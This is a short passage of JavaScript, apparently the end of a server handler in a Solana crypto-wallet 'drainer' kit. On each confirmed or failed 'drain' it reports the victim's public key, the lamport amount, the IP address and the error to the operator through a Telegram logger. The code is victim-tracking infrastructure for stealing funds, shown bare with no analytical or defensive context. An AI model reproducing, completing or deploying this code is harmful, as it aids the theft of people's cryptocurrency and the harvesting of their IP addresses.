        actualDrainAmount: 0, // Will be calculated from transaction
        ip: userIp
      });
    } else if (status === 'failed') {
      // Log failed drain
      await telegramLogger.logDrainFailed({
        publicKey: publicKey,
        lamports: 0,
        ip: userIp,
        error: error || 'Transaction failed on-chain'
      });
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Log confirmation error:', error);
    res.status(500).json({ error: 'Failed to log confirmation' });
  }
} 